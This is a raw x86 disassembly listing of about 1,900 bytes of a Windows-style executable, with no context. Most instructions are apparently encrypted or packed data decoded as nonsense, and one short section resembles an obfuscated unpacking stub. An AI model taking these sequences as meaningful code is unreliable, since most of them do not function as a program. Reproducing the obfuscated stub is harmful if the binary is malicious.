  40972c:	mov    ebx,0xabf52606
  409731:	int3   
  409732:	dec    esi
  409733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409734:	arpl   WORD PTR [edi-0x57],cx
  409737:	std    
  409738:	and    eax,esi
  40973a:	push   edx
  40973b:	sub    BYTE PTR [esi-0x7157660c],0x5f
  409742:	ins    DWORD PTR es:[edi],dx
  409743:	bound  esi,QWORD PTR [esi+0x38]
  409746:	xor    esp,edx
  409748:	jp     0x4096db
  40974a:	inc    ebp
  40974b:	inc    eax
  40974c:	inc    ecx
  40974d:	loope  0x409787
  40974f:	xor    al,BYTE PTR [esi+esi*1]
  409752:	pop    ecx
  409753:	stos   DWORD PTR es:[edi],eax
  409754:	jge    0x409783
  409756:	cmp    al,0xa5
  409758:	aas    
  409759:	sub    eax,0x37cf290d
  40975e:	sbb    DWORD PTR [ecx-0x22f69003],esi
  409764:	lds    ebp,FWORD PTR [esi]
  409766:	in     al,0x9c
  409768:	popa   
  409769:	sahf   
  40976a:	retf   
  40976b:	sbb    DWORD PTR [eax],0xffffffdb
  40976e:	sbb    al,0x52
  409770:	outs   dx,BYTE PTR ds:[esi]
  409771:	pop    es
  409772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409773:	xchg   DWORD PTR [eax+eax*4+0x6fd106a4],esp
  40977a:	aaa    
  40977b:	pop    eax
  40977c:	call   0xe1ef63eb
  409781:	mov    ebx,ebp
  409783:	pop    esp
  409784:	popf   
  409785:	shl    DWORD PTR [ebx-0x3b],cl
  409788:	ins    DWORD PTR es:[edi],dx
  409789:	repnz push ebx
  40978b:	aam    0x3f
  40978d:	lods   eax,DWORD PTR ds:[esi]
  40978e:	mov    dl,0xd
  409790:	sub    eax,0x24295e94
  409795:	scas   eax,DWORD PTR es:[edi]
  409796:	arpl   WORD PTR [edx],di
  409798:	aaa    
  409799:	addr16 or ebp,eax
  40979c:	add    eax,0x27d9a9a3
  4097a1:	mov    edx,0xfc10f7cd
  4097a6:	sub    eax,0xd0a8af3b
  4097ab:	outs   dx,BYTE PTR ds:[esi]
  4097ac:	bound  edi,QWORD PTR [eax]
  4097ae:	xlat   BYTE PTR ds:[ebx]
  4097af:	das    
  4097b0:	or     eax,0x72ef2443
  4097b5:	jle    0x4097fe
  4097b7:	cmp    bl,BYTE PTR [edx]
  4097b9:	fld1   
  4097bb:	xor    al,0xeb
  4097bd:	loopne 0x409784
  4097bf:	pop    ss
  4097c0:	mov    cl,0xa
  4097c2:	jmp    0x9827152e
  4097c7:	(bad)  
  4097c8:	fild   WORD PTR ds:0x337db24
  4097ce:	jns    0x409780
  4097d0:	inc    edi
  4097d1:	lods   eax,DWORD PTR ds:[esi]
  4097d2:	inc    ebx
  4097d3:	lods   al,BYTE PTR ds:[esi]
  4097d4:	lods   eax,DWORD PTR ds:[esi]
  4097d5:	xor    DWORD PTR [esi+0x4d],ebx
  4097d8:	test   DWORD PTR [edi+0x33],eax
  4097db:	push   ebp
  4097dc:	mov    edx,0x709651c0
  4097e1:	inc    ebx
  4097e2:	push   eax
  4097e3:	mov    bl,0x55
  4097e5:	in     eax,dx
  4097e6:	xor    al,0x36
  4097e8:	add    eax,0x584e6ba9
  4097ed:	fsubrp st(5),st
  4097ef:	add    al,0xa
  4097f1:	push   ebx
  4097f2:	ins    DWORD PTR es:[edi],dx
  4097f3:	leave  
  4097f4:	push   ds
  4097f5:	(bad)  
  4097f7:	xor    ebp,DWORD PTR [eax-0x70]
  4097fa:	(bad)  
  4097fb:	cld    
  4097fc:	cld    
  4097fd:	cli    
  4097fe:	dec    esp
  4097ff:	js     0x409795
  409801:	pop    edx
  409802:	and    eax,esi
  409804:	push   ebp
  409805:	ins    DWORD PTR es:[edi],dx
  409806:	cmc    
  409807:	cmp    al,0xf4
  409809:	sub    edx,DWORD PTR [edi+edx*1+0x3006ef63]
  409810:	xor    bh,BYTE PTR [ebx-0xa]
  409813:	adc    cl,BYTE PTR [edi-0xc94c253]
  409819:	adc    al,BYTE PTR [edi+0x50a41bf8]
  40981f:	pop    esi
  409820:	jno    0x4097f6
  409822:	rcr    DWORD PTR [edx+0x12],0x3d
  409826:	xor    BYTE PTR [esp+ebx*1],0x3a
  40982a:	inc    edi
  40982b:	jnp    0x40987a
  40982d:	cmp    BYTE PTR [ecx+ebx*4-0x3c],al
  409831:	fisttp WORD PTR [ebx-0x13]
  409834:	sbb    eax,0xc6adc782
  409839:	or     ecx,0x9243f4ce
  40983f:	fisubr WORD PTR [edx]
  409841:	mov    bh,dl
  409843:	add    DWORD PTR [ebp+0x6e],ebp
  409846:	jns    0x409859
  409848:	iret   
  409849:	xchg   ebp,eax
  40984a:	jmp    ebp
  40984c:	les    eax,FWORD PTR [ebx-0x2a]
  40984f:	xor    eax,0x72767e7c
  409854:	call   0xed6aa739
  409859:	int    0xa4
  40985b:	mov    ebp,0xd7b9a7b5
  409860:	mov    ch,0x55
  409862:	cmp    eax,0x8e349c13
  409867:	xor    DWORD PTR [ecx],esi
  409869:	out    dx,eax
  40986a:	loop   0x4098be
  40986c:	cmp    eax,0xfa3d569
  409871:	addr16 loopne 0x409861
  409874:	jbe    0x4098da
  409876:	sbb    BYTE PTR [eax-0x68],0xe6
  40987a:	sub    BYTE PTR [edx+0x22],bl
  40987d:	dec    ebx
  40987e:	inc    esp
  40987f:	test   al,0xb0
  409881:	daa    
  409882:	nop
  409883:	xchg   edx,eax
  409884:	inc    ebp
  409885:	jmp    0xb984887a
  40988a:	push   ebp
  40988b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40988d:	call   0xc1cc818f
  409892:	test   DWORD PTR [eax+0x5814ca6d],0xf409fc38
  40989c:	test   DWORD PTR [eax+0x49],0xaed0ffe7
  4098a3:	dec    esi
  4098a4:	loop   0x40986f
  4098a6:	add    BYTE PTR [edx+0x7ad6f0ac],bh
  4098ac:	mov    BYTE PTR [eax+edx*2-0x2c],ch
  4098b0:	adc    eax,0xadc5172d
  4098b5:	hlt    
  4098b6:	add    eax,0xdcecfc8
  4098bb:	jnp    0x409874
  4098bd:	imul   ebx,DWORD PTR [edi+0x75c3c7ba],0xa9d38f6a
  4098c7:	mov    al,ds:0xb5182355
  4098cc:	xor    edx,ebx
  4098ce:	gs aam 0x56
  4098d1:	imul   ebp,ebx,0xffffff9d
  4098d4:	sub    DWORD PTR [esp+ecx*1],ecx
  4098d7:	ja     0x40990d
  4098d9:	jp     0x409943
  4098db:	add    BYTE PTR [edx-0x18bd4c65],dl
  4098e1:	rol    BYTE PTR [ebp+0x11bf992],cl
  4098e7:	sahf   
  4098e8:	jno    0x409943
  4098ea:	xlat   BYTE PTR ds:[ebx]
  4098eb:	xor    ebx,DWORD PTR [ecx+0x4ccf1116]
  4098f1:	jno    0x4098bd
  4098f3:	adc    DWORD PTR [esi],eax
  4098f5:	mov    ebx,fs
  4098f7:	ss jg  0x409974
  4098fa:	inc    edx
  4098fb:	xor    DWORD PTR [ebp+0x7a],eax
  4098fe:	cmp    dh,cl
  409900:	xchg   esp,eax
  409901:	pop    esp
  409902:	add    cl,dl
  409904:	(bad)  
  409905:	mov    ch,0xa8
  409907:	(bad)  
  409908:	lahf   
  409909:	and    al,BYTE PTR [ecx+0x36]
  40990c:	clc    
  40990d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40990e:	mov    esp,0x9e57f438
  409913:	fnstcw WORD PTR [eax-0x5a]
  409916:	mov    bh,0xb9
  409918:	(bad)  
  409919:	(bad)  [ebp+0x24ac4ccf]
  40991f:	pop    edi
  409920:	scas   al,BYTE PTR es:[edi]
  409921:	into   
  409922:	ins    BYTE PTR es:[edi],dx
  409923:	stos   DWORD PTR es:[edi],eax
  409924:	ret    
  409925:	arpl   WORD PTR [ebp+0x1f],dx
  409928:	push   ss
  409929:	repz sbb ebp,esp
  40992c:	mov    ?,WORD PTR [esi]
  40992e:	xchg   ebp,eax
  40992f:	mov    bh,0xaf
  409931:	ja     0x40996e
  409933:	cmp    edx,DWORD PTR ds:0x3598e871
  409939:	inc    esi
  40993a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993b:	outs   dx,BYTE PTR ds:[esi]
  40993c:	int3   
  40993d:	out    dx,al
  40993e:	out    0x2f,al
  409940:	fiadd  DWORD PTR [ecx+0x6d68de11]
  409946:	popa   
  409947:	(bad)  
  409948:	out    0xfc,eax
  40994a:	fisttp DWORD PTR [ecx]
  40994c:	cdq    
  40994d:	fimul  WORD PTR ds:0xb99a0bc9
  409953:	sub    BYTE PTR [esi+0x43],cl
  409956:	fwait
  409957:	pop    esp
  409958:	add    eax,esp
  40995a:	clc    
  40995b:	loop   0x4099b3
  40995d:	sahf   
  40995e:	repnz (bad) 
  409961:	das    
  409962:	dec    edx
  409963:	out    0x3a,al
  409965:	idiv   DWORD PTR [edx+0x7c]
  409968:	add    bh,BYTE PTR [eax+0x64]
  40996b:	xor    al,0x1a
  40996d:	mov    ds:0x839369f9,al
  409972:	loopne 0x40993f
  409974:	int3   
  409975:	dec    edi
  409976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409977:	push   ecx
  409978:	jbe    0x40996c
  40997a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40997b:	cmp    edi,DWORD PTR [edi-0x7e]
  40997e:	sub    DWORD PTR [ebx+0xa],0xce103ac6
  409985:	inc    ebx
  409986:	and    eax,0xcc15b78b
  40998b:	xchg   edx,eax
  40998c:	pop    es
  40998d:	mov    dh,0x94
  40998f:	scas   al,BYTE PTR es:[edi]
  409990:	xchg   esp,eax
  409991:	push   esp
  409992:	imul   eax,eax,0x946b1df7
  409998:	stos   BYTE PTR es:[edi],al
  409999:	in     eax,0x96
  40999b:	or     eax,edx
  40999d:	test   BYTE PTR [ecx],ch
  40999f:	xchg   ecx,eax
  4099a0:	push   edx
  4099a1:	out    dx,al
  4099a2:	scas   eax,DWORD PTR es:[edi]
  4099a3:	ins    BYTE PTR es:[edi],dx
  4099a4:	or     BYTE PTR [ecx-0x39],0x6e
  4099a8:	jbe    0x4099b1
  4099aa:	clc    
  4099ab:	mov    bh,BYTE PTR [edx-0x33]
  4099ae:	jns    0x409958
  4099b0:	mov    eax,0x1af3a731
  4099b5:	mov    eax,0x3d646354
  4099ba:	arpl   WORD PTR [edx],bp
  4099bc:	aaa    
  4099bd:	ficom  WORD PTR [edx-0x2aefce76]
  4099c3:	cmp    DWORD PTR [edi],edi
  4099c5:	mov    ecx,0xfd2cd0e5
  4099ca:	push   0x43
  4099cc:	test   DWORD PTR [esi],ebx
  4099ce:	jmp    0x12cc:0xef48d854
  4099d5:	rcr    DWORD PTR [esi-0x3ed92dc2],1
  4099db:	xor    DWORD PTR ds:0x1aa3d003,ebx
  4099e1:	adc    al,BYTE PTR [esp+esi*8+0x598a4e3c]
  4099e8:	dec    edx
  4099e9:	push   eax
  4099ea:	cdq    
  4099eb:	pop    eax
  4099ec:	add    eax,0x248c5bf
  4099f1:	arpl   bp,si
  4099f3:	or     eax,0xd2bd4d41
  4099f8:	cmp    eax,0xb8ec542a
  4099fd:	(bad)  
  4099fe:	jl     0x409a33
  409a00:	push   ss
  409a01:	scas   al,BYTE PTR es:[edi]
  409a02:	mov    ds:0xd0342033,eax
  409a07:	mov    edx,0x8d13a4a0
  409a0c:	imul   edi,DWORD PTR [eax],0xffffff9b
  409a0f:	lock rol ebp,1
  409a12:	add    dh,BYTE PTR [edx+0x64]
  409a15:	pop    ebx
  409a16:	in     eax,0xee
  409a18:	dec    edx
  409a19:	push   0x80d8fd1b
  409a1e:	push   edi
  409a1f:	pop    edx
  409a20:	ins    DWORD PTR es:[edi],dx
  409a21:	jl     0x409a15
  409a23:	jns    0x4099e2
  409a25:	bound  ecx,QWORD PTR [ebx-0x46]
  409a28:	sahf   
  409a29:	push   es
  409a2a:	test   al,0x4d
  409a2c:	jmp    0x3c19:0xd2ac6ead
  409a33:	cld    
  409a34:	daa    
  409a35:	aas    
  409a36:	retf   
  409a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a38:	ds pushf 
  409a3a:	inc    esp
  409a3b:	mov    al,dh
  409a3d:	test   bh,dl
  409a3f:	hlt    
  409a40:	pop    edi
  409a41:	pushf  
  409a42:	sub    dl,BYTE PTR [edx]
  409a44:	scas   al,BYTE PTR es:[edi]
  409a45:	inc    edi
  409a46:	cwde   
  409a47:	out    0xf7,eax
  409a49:	cdq    
  409a4a:	lea    eax,[edi]
  409a4c:	fimul  DWORD PTR [edx+0x62e41465]
  409a52:	lods   eax,DWORD PTR ds:[esi]
  409a53:	ret    
  409a54:	mov    ah,0xc1
  409a56:	cwde   
  409a57:	mov    ds:0x468133b7,al
  409a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5d:	push   es
  409a5e:	mov    eax,ds:0x32383029
  409a63:	fsub   DWORD PTR [edi-0x4d]
  409a66:	(bad)  
  409a68:	cmp    DWORD PTR [esi+0x33e5b8bd],edx
  409a6e:	out    0xa1,eax
  409a70:	or     ah,BYTE PTR [ebp-0x2e1eb819]
  409a76:	stos   BYTE PTR es:[edi],al
  409a77:	jo     0x409a8b
  409a79:	in     al,0x91
  409a7b:	clc    
  409a7c:	lods   eax,DWORD PTR ds:[esi]
  409a7d:	push   0xffffffa3
  409a7f:	mov    ch,0xcd
  409a81:	adc    eax,DWORD PTR [edi+ebp*4-0x33]
  409a85:	call   DWORD PTR [ebx+edi*8-0x76]
  409a89:	adc    BYTE PTR [ebp+0x18b16020],0x4f
  409a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a91:	dec    ecx
  409a92:	pop    esi
  409a93:	xchg   DWORD PTR ss:[ebx+0x5],eax
  409a97:	jmp    0x230a:0xaaceece0
  409a9e:	lmsw   WORD PTR [edi]
  409aa1:	pop    ds
  409aa2:	push   edx
  409aa3:	inc    esp
  409aa4:	in     al,dx
  409aa5:	or     DWORD PTR [esi-0x5e02753e],0x6e
  409aac:	and    eax,DWORD PTR ds:0xcca1708e
  409ab2:	pop    ebp
  409ab3:	add    al,0xf6
  409ab5:	gs adc eax,0xd8b5674
  409abb:	or     BYTE PTR [eax],ah
  409abd:	inc    edx
  409abe:	add    BYTE PTR [ebx],al
  409ac0:	or     eax,0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b4b
  409b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b49:	push   edx
  409b4a:	jg     0x409b85
  409b4c:	add    al,0x7a
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	sbb    al,0xcd
  409b55:	out    0xd0,al
  409b57:	fwait
  409b58:	pop    ecx
  409b59:	jl     0x409b24
  409b5b:	out    0x91,al
  409b5d:	repz cli 
  409b5f:	imul   esp,DWORD PTR [esi-0x66d266df],0xfb269521
  409b69:	jnp    0x409bc3
  409b6b:	jns    0x409be1
  409b6d:	push   esi
  409b6e:	push   cs
  409b6f:	mov    esp,0xe36f64ed
  409b74:	cli    
  409b75:	aas    
  409b76:	mov    WORD PTR [ebx],fs
  409b78:	cmp    bh,BYTE PTR [ecx]
  409b7a:	sbb    eax,0x7244e9a
  409b7f:	add    eax,0x3d0a8c67
  409b84:	sub    DWORD PTR [ecx],ebx
  409b86:	xor    cl,BYTE PTR [eax+0x27b48900]
  409b8c:	aas    
  409b8d:	jno    0x409bed
  409b8f:	adc    cl,BYTE PTR [edx-0x45]
  409b92:	mov    BYTE PTR [bp-0x70f3],dh
  409b97:	scas   eax,DWORD PTR es:[edi]
  409b98:	jmp    0xac6c:0x645392e8
  409b9f:	dec    eax
  409ba0:	fimul  DWORD PTR [eax]
  409ba2:	pop    ebx
  409ba3:	xchg   ebx,eax
  409ba4:	mov    WORD PTR ds:0x38925dd8,gs
  409baa:	xor    eax,0x49074f7b
  409baf:	test   DWORD PTR ds:0x626a9cdd,ebx
  409bb5:	mov    bl,0x67
  409bb7:	les    ecx,FWORD PTR [eax-0x3766fb7]
  409bbd:	push   ecx
  409bbe:	mov    al,BYTE PTR [ebp+0x5dac17da]
  409bc4:	sahf   
  409bc5:	imul   edx,DWORD PTR [ebp-0x51],0xffffffd6
  409bc9:	cwde   
  409bca:	outs   dx,BYTE PTR ds:[esi]
  409bcb:	mov    dh,0x67
  409bcd:	aas    
  409bce:	xchg   ebx,eax
  409bcf:	hlt    
  409bd0:	pusha  
  409bd1:	loop   0x409bc5
  409bd3:	test   BYTE PTR [esi],al
  409bd5:	daa    
  409bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd7:	repz test BYTE PTR [edi-0x5f],cl
  409bdb:	and    esp,edi
  409bdd:	add    BYTE PTR [ebp-0x4a286fba],al
  409be3:	sahf   
  409be4:	(bad)  
  409be5:	retf   
  409be6:	sub    edi,DWORD PTR [edi+0x290c1c2f]
  409bec:	(bad)  
  409bed:	mov    esp,0x33623606
  409bf2:	inc    edi
  409bf3:	inc    ebx
  409bf4:	push   ebp
  409bf5:	into   
  409bf6:	adc    DWORD PTR [edx-0x13],ebp
  409bf9:	inc    eax
  409bfa:	call   0xbcbb:0xce659a77
  409c01:	lods   eax,DWORD PTR ds:[esi]
  409c02:	fld    DWORD PTR [ecx-0x78d30896]
  409c08:	hlt    
  409c09:	and    al,0x6b
  409c0b:	cmp    esi,esi
  409c0d:	lds    eax,FWORD PTR [ebx+ebx*8]
  409c10:	cmp    eax,0xa0aef15c
  409c15:	push   0x6b
  409c17:	and    esi,DWORD PTR [edi]
  409c19:	jmp    0x6def373a
  409c1e:	dec    ebp
  409c1f:	mov    ds:0x77738b24,eax
  409c24:	fist   DWORD PTR [ecx]
  409c26:	fxch   st(2)
  409c28:	push   cs
  409c29:	mov    dl,0xd8
  409c2b:	jp     0x409bbc
  409c2d:	inc    eax
  409c2e:	or     eax,0x30feb773
  409c33:	lahf   
  409c34:	lock add al,BYTE PTR [edx+0x41]
  409c38:	scas   eax,DWORD PTR es:[edi]
  409c39:	js     0x409c6b
  409c3b:	pusha  
  409c3c:	jecxz  0x409be1
  409c3e:	sbb    eax,0x810a1310
  409c43:	pop    ss
  409c44:	ja     0x409cb9
  409c46:	ins    BYTE PTR es:[edi],dx
  409c47:	xor    eax,DWORD PTR [ecx]
  409c49:	(bad)  
  409c4a:	lods   al,BYTE PTR ds:[esi]
  409c4b:	inc    ecx
  409c4c:	dec    eax
  409c4d:	cld    
  409c4e:	mov    al,0x6c
  409c50:	cwde   
  409c51:	push   eax
  409c52:	sbb    al,0xad
  409c54:	adc    bl,BYTE PTR [edi+0x291532ee]
  409c5a:	sahf   
  409c5b:	pop    ebp
  409c5c:	mov    al,ds:0xdc8e91b7
  409c61:	stos   DWORD PTR es:[edi],eax
  409c62:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c64:	aam    0x6d
  409c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c67:	lods   eax,DWORD PTR ds:[esi]
  409c68:	(bad)  
  409c69:	rol    BYTE PTR ds:0x7ddab7dd,cl
  409c6f:	mov    ebx,0x50003ed2
  409c74:	shl    BYTE PTR [ecx],1
  409c76:	fcomip st,st(0)
  409c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c79:	and    DWORD PTR [esi+eax*4+0x200eea83],0x53b2c2a
  409c84:	push   edi
  409c85:	jg     0x409ce4
  409c87:	cs sbb eax,0x6044c421
  409c8d:	sti    
  409c8e:	push   cs
  409c8f:	sahf   
  409c90:	ret    0x397d
  409c93:	stos   DWORD PTR es:[edi],eax
  409c94:	cli    
  409c95:	sub    DWORD PTR [edx],ecx
  409c97:	ret    0x583c
  409c9a:	pop    esp
  409c9b:	int    0xf8
  409c9d:	int3   
  409c9e:	mov    bh,0x10
  409ca0:	ja     0x409c3a
  409ca2:	adc    al,0x6d
  409ca4:	arpl   WORD PTR [edi],bp
  409ca6:	pop    ebx
  409ca7:	xor    DWORD PTR [esi-0x34],eax
  409caa:	mov    ah,0x39
  409cac:	dec    edx
  409cad:	inc    esp
  409cae:	sahf   
  409caf:	arpl   WORD PTR [edx-0x108076a8],ax
  409cb5:	push   esp
  409cb6:	add    BYTE PTR [edx-0x1ef69ab9],0x8e
  409cbd:	inc    ebx
  409cbe:	cmp    eax,0xc03f9c8d
  409cc3:	sar    BYTE PTR [edi-0x58],cl
  409cc6:	adc    al,0xc5
  409cc8:	sub    ah,cl
  409cca:	inc    esi
  409ccb:	es int3 
  409ccd:	bound  ebx,QWORD PTR [edi+0xdbf249e]
  409cd3:	scas   eax,DWORD PTR es:[edi]
  409cd4:	add    esi,DWORD PTR [esi+0x6a]
  409cd7:	mov    al,0xbe
  409cd9:	or     cl,0xd8
  409cdc:	cmp    BYTE PTR [ecx+eiz*8],bh
  409cdf:	test   eax,0x7f068f15
  409ce4:	jae    0x409d56
  409ce6:	hlt    
  409ce7:	lods   al,BYTE PTR ds:[esi]
  409ce8:	push   ds
  409ce9:	cwde   
  409cea:	ret    0xf042
  409ced:	dec    edx
  409cee:	xor    BYTE PTR ds:0x66dc4b3a,bh
  409cf4:	leave  
  409cf5:	lahf   
  409cf6:	xchg   ecx,eax
  409cf7:	push   edx
  409cf8:	pop    edx
  409cf9:	and    esp,DWORD PTR ds:0x97bfcac4
  409cff:	jmp    0xba32abc6
  409d04:	xor    BYTE PTR [edx-0x80],cl
  409d07:	pop    ss
  409d08:	or     BYTE PTR [ecx-0x34ee1b27],ah
  409d0e:	push   edi
  409d0f:	aam    0xc9
  409d11:	test   al,0x42
  409d13:	pop    esi
  409d14:	(bad)  
  409d15:	test   BYTE PTR [ecx+0x37],dl
  409d18:	loope  0x409cc8
  409d1a:	adc    ebp,ebx
  409d1c:	xlat   BYTE PTR ds:[ebx]
  409d1d:	jmp    0x7556f68a
  409d22:	mov    ch,ah
  409d24:	xchg   ecx,eax
  409d25:	sti    
  409d26:	ret    
  409d27:	jg     0x409cfe
  409d29:	cwde   
  409d2a:	stc    
  409d2b:	stos   BYTE PTR es:[edi],al
  409d2c:	stos   BYTE PTR es:[edi],al
  409d2d:	or     BYTE PTR [edi-0x327a00f4],0xc6
  409d34:	add    eax,0x9d6ddb3a
  409d39:	dec    ebx
  409d3a:	xchg   ebp,eax
  409d3b:	mov    ds:0x30d89dc9,eax
  409d40:	cmp    eax,DWORD PTR [bp-0x6c]
  409d44:	outs   dx,BYTE PTR ds:[esi]
  409d45:	fiadd  DWORD PTR [edx-0x5d]
  409d48:	int    0xa3
  409d4a:	stos   DWORD PTR es:[edi],eax
  409d4b:	cmp    al,BYTE PTR [edi+edx*4-0x550dafb3]
  409d52:	(bad)  
  409d53:	xchg   esi,eax
  409d54:	mov    al,BYTE PTR [edx-0x52834935]
  409d5a:	jbe    0x409d08
  409d5c:	ret    
  409d5d:	xchg   ecx,eax
  409d5e:	retf   
  409d5f:	pop    ebp
  409d60:	je     0x409d7b
  409d62:	add    al,BYTE PTR [edx]
  409d64:	aam    0xa7
  409d66:	or     bh,BYTE PTR [ecx+0x70]
  409d69:	shl    DWORD PTR [eax],cl
  409d6b:	pop    ds
  409d6c:	jbe    0xba5a4289
  409d72:	test   eax,0xc679b187
  409d77:	fnstsw WORD PTR [ecx+ebx*8+0x3b39c42]
  409d7e:	push   esp
  409d7f:	fnstsw WORD PTR [ebx+0x53]
  409d82:	lods   eax,DWORD PTR ds:[esi]
  409d83:	jmp    DWORD PTR [edx]
  409d85:	push   cs
  409d86:	adc    al,0x12
  409d88:	lea    ebx,[edi]
  409d8a:	mov    al,ds:0x319697ad
  409d8f:	jno    0x409dd9
  409d91:	or     al,0x69
  409d93:	xchg   edx,eax
  409d94:	cmp    al,0x2d
  409d96:	pop    ecx
  409d97:	pop    ds
  409d98:	adc    esi,0x63e99d85
  409d9e:	xchg   edx,eax
  409d9f:	adc    al,0x86
  409da1:	stc    
  409da2:	jecxz  0x409d6c
  409da4:	imul   eax,DWORD PTR [esi+0x6489bbbb],0xa216b617
  409dae:	sub    ecx,DWORD PTR [edi]
  409db0:	push   esp
  409db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409db2:	das    
  409db3:	dec    ebp
  409db4:	mov    ?,WORD PTR [esi+0x3da17b96]
  409dba:	pop    esi
  409dbb:	ret    0x60d
  409dbe:	mov    BYTE PTR [eax-0x47],ch
  409dc1:	jmp    0x409d80
  409dc3:	add    eax,0xd7037da0
  409dc8:	jns    0x409df8
  409dca:	cmc    
  409dcb:	sar    DWORD PTR [ebx+0x4304f7a2],1
  409dd1:	pop    esi
  409dd2:	dec    ecx
  409dd3:	or     DWORD PTR [eax-0x7c17d7de],ecx
  409dd9:	pop    esp
  409dda:	adc    al,0x2f
  409ddc:	data16 sbb ch,BYTE PTR [eax-0x4a]
  409de0:	mov    eax,0xee9d5a54
  409de5:	test   al,0x91
  409de7:	fwait
  409de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de9:	pop    ss
  409dea:	imul   BYTE PTR [ecx]
  409dec:	xchg   ebp,eax
  409ded:	jbe    0x409e5e
  409def:	jns    0x409e1d
  409df1:	jl     0x409ddb
  409df3:	jae    0x409db2
  409df5:	cwde   
  409df6:	imul   ebp,DWORD PTR [ebp*8-0x2f869d8a],0x7d1c9df
  409e01:	mov    al,ds:0x733c1a84
  409e06:	xor    ch,BYTE PTR [edi+edi*8+0x5825318d]
  409e0d:	pop    esp
  409e0e:	mov    al,0x57
  409e10:	in     eax,0x1e
  409e12:	push   es
  409e13:	xchg   edi,eax
  409e14:	fiadd  WORD PTR [eax-0x18ecb7a1]
  409e1a:	inc    esp
  409e1b:	push   0x71
  409e1d:	push   eax
  409e1e:	pop    ebp
  409e1f:	pusha  
  409e20:	add    BYTE PTR [edx+0x259a6313],dh
  409e26:	jmp    0x264f:0x10c7d0f8
  409e2d:	or     al,BYTE PTR [edi+0x4f]
  409e30:	int    0x8f
  409e32:	add    al,0xe4
  409e34:	dec    ebp
  409e35:	cli    
  409e36:	cmp    edi,DWORD PTR [esi-0xc]
  409e39:	ret    0x1c00
  409e3c:	jmp    0x409e1f
  409e3e:	cmc    
  409e3f:	call   ebp
  409e41:	out    0x4c,al
  409e43:	and    esp,DWORD PTR [esi]
  409e45:	dec    edi
  409e46:	in     al,dx
  409e47:	xchg   dh,bh
  409e49:	mov    ah,0xf3
  409e4b:	dec    ebx
  409e4c:	jns    0x409e60
  409e4e:	pop    ebp
  409e4f:	jnp    0x409e8b
  409e51:	xchg   ebp,eax
  409e52:	push   esp
  409e53:	mov    edx,0xcc21bfba
  409e58:	cli    
  409e59:	jne    0x409e6a
  409e5b:	jo     0x409e59
  409e5d:	push   edi
  409e5e:	inc    esi
  409e5f:	leave  
  409e60:	xchg   edx,eax
  409e61:	jle    0x409e67
  409e63:	test   eax,0xa18d0bd2
  409e68:	lds    edi,FWORD PTR [edi-0x6be4ee8d]
  409e6e:	aad    0x4c
  409e70:	adc    cl,BYTE PTR [ebx+0x6a95f8ec]
  409e76:	pop    edx
  409e77:	ds mov ebx,0x4382ffb5
  409e7d:	stos   DWORD PTR es:[edi],eax
  409e7e:	lea    esp,[esi+edi*4+0x4ba66811]
  409e85:	pop    esi
  409e86:	int    0x93
  409e88:	add    ah,BYTE PTR [ecx+ecx*1-0x54298ff5]
  409e8f:	aas    
  409e90:	dec    edi
  409e91:	stos   DWORD PTR es:[edi],eax
  409e92:	sub    esi,DWORD PTR [edi-0x588b82db]
  409e98:	push   eax
  409e99:	int    0x54
  409e9b:	sub    DWORD PTR [esp+eax*4],esp
  409e9e:	jnp    0x409ef1
  409ea0:	jecxz  0x409e26
  409ea2:	and    al,0xcb
  409ea4:	xor    ebx,eax
  409ea6:	idiv   BYTE PTR [esp+edi*4-0x58094312]
  409ead:	inc    edx
  409eae:	mov    al,0xdb
  409eb0:	or     dh,BYTE PTR [ecx+0x2fb34fe3]
  409eb6:	repz cwde 
  409eb8:	sbb    eax,0xaecb804d
  409ebd:	dec    ecx
  409ebe:	sub    cl,ah
  409ec0:	mov    BYTE PTR [di],bl
  409ec3:	fcom   QWORD PTR [edx-0x70]
  409ec6:	lahf   
  409ec7:	mov    ch,0x8c
